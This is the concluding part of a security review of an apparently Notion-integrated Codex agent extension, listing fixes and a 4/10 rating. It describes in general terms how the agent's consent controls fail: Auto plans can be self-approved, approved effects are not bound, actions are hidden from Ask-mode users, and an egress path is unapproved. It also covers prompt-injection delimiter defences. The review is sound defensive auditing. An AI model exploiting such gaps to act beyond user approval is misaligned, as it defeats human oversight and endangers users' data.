- Repair H2's Auto self-authorization and scope matching before demonstrating structural writes against anything valuable.
- Make action payloads fully reviewable (H3).
- Enforce one mutation owner across undo and forward execution (H4).
- Stop unsafe mutation replay on ambiguous transport failure (H5), and make unknown/applied-with-journal-failure states visible (M4).
- Resolve the known plan friction with scoped inherited approval, not a broader bypass (M1/M2).
- Correct the demonstrably false claims in D1. A public claim of injection-proof writes, exact previews, non-writable temp cwd, or supported property/image features is easy to refute today.
- Run disposable real Notion write/undo/cancel and two-window checks for the features shown. Verify the selected Codex version/model's native tool boundary; do not represent pending acceptance as passed.
- Include license/notices when distributing ZIP artifacts (M15).

These are blockers to presenting the current safety design as technically defensible, not a prohibition on sharing source with an explicit defect list for collaborative review.

### Should fix soon

- Required successful read baselines and target parsing (M3), scheduler admission (M6), and first-class upload policy (M5).
- Attachment deletion, sign-out races, multi-window database lifecycle, disabled-search hydration, and recoverable history persistence (M7–M10, M16).
- Unicode stream decoding, runtime protocol limits/SSE correctness, DNR scoping/probing, and plan-field validation (M11–M14).
- Patch the development advisory, improve connection recovery and diagnostic privacy, and exercise installer/release paths in CI.
- Shorten mandatory agent reading and reconcile CONTRIBUTING with the assembly patterns actually used.

### Acceptable alpha limitations

- Unpacked installation and separately installed native host, with accurately stated supported browsers/OSs and update/uninstall instructions.
- Experimental Codex dynamic tools with a published tested compatibility matrix and fail-closed boundary checks.
- No automatic deletion of creations and no property/schema/move undo; disclose this before relevant changes.
- Best-effort conflict detection because Notion MCP offers no conditional writes, provided missing baselines and internal writer races are fixed and the residual final race is explicit.
- Ten-minute/dynamic-tool limits, observed rather than pre-execution native-search limits, bounded excerpts, and no resumable background job when the panel closes.
- Attachment upload only, without PDF/image understanding, if the UI/README say so and upload consent/egress are corrected.
- Locally retained Nox and Codex history, and no Nox-operated backend or telemetry, with accurate external-provider disclosure and functional deletion.
- A small manual scratch-workspace release checklist rather than enterprise-scale infrastructure or exhaustive model quality benchmarking.

### False positives / things that initially looked suspicious but are correct

- Public extension key is not a private credential.
- `approvalPolicy: 'never'` does not directly bypass Nox's normal Notion gate.
- Unknown tools treated conservatively are not proof of unrestricted ordinary execution; the problem is how that classification combines with Auto plan bypass and planning friction.
- Reopening/resuming keeps the original Codex thread and does not replay a failed submitted turn.
- Delimiter escaping addresses literal marker breakout; do not waste time reporting the unescaped-marker attack that the code already prevents.
- Unsupported property/creation undo is disabled in code; report inaccurate marketing rather than claim an unsafe property inverse exists.
- The audit's two moderate package entries are one development advisory with preconditions, not two exploitable production vulnerabilities.
- The writable temp directory is a false documentation claim, not by itself proof that the model can execute local commands through the restricted tool surface.

### Overall assessment

**4/10.** The repository builds and its ordinary lifecycle is testable, but the advertised authority boundaries fail in several concrete paths. The strongest criticism is the mismatch between visible consent and actual execution: a plan can be self-approved, its effects are not bound, Ask users cannot see the full action, and a viewer can still write. Privacy also depends on model behavior while rendering supplies an unapproved egress mechanism.

Fixing those paths, preserving durable unknown outcomes, and adding regressions at the production assembly boundaries would improve readiness far more than a rewrite or additional abstractions. A rating near 10 would also require real supported-version/model/Chrome/Notion evidence, reliable recovery/deletion, reproducible release artifacts with notices, and documentation that states precisely what is implemented and what remains conditional. This review does not certify that those remaining checks would find no further High issues.
